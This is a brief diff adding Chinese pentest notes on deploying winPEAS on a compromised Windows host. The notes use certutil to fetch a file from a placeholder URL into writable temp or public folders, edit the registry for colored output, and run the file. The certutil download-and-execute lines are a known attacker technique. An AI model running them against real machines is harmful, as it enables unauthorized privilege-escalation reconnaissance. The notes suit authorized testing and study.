@@ -1,0 +1,9 @@
+项目地址:https://github.com/peass-ng/PEASS-ng
+>下载winpeas到C:\windows\temp目录下
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>适用于temp目录不可写的时候，往公共用户目录写
+certutil -urlcache -split -f $downloadurl C:\users\public\$badfile
+>改注册表使得winpeas能够格式化输出
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+>运行winpeas
+C:\windows\temp\$badfile
